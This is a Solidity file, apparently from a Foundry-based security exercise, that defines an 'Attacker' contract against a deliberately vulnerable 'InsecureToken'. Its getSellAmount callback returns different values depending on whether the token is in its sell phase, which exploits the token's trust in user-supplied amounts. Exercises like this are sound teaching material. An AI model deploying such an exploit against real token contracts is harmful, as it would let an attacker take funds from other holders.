// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.7.4;

import "forge-std/Test.sol";

import "../src/InsecureToken.sol";

contract Attacker is User {
    address public insecureTokenAddr;
    uint256 private constant MAX_UINT256 = type(uint256).max;
    uint256 public constant TOKEN_PRICE = 1 ether;

    constructor(address _insecureTokenAddr) public {
        insecureTokenAddr = _insecureTokenAddr;
    }

    function getBuyAmount(uint256 _buyAmount) external view override returns (uint256) {
        return _buyAmount;
    }

    function getSellAmount(uint256 _sellAmount) external view override returns (uint256) {
        // return _sellAmount;
        if (InsecureToken(insecureTokenAddr).isSellPhase()) {
            return 0;
        } else {
            return 10;
        }
        // bool isSellPhase;
        // assembly {
        //     // bytes32 slot = bytes32(uint256(address(this)) + 1);
        //     // 計算存儲槽的位置
        //     let slot := keccak256(insecureTokenAddr)
        //     // 從存儲中讀取變數的值
        //     isSellPhase := sload(slot)
        // }
    }

    receive() external payable {}
}
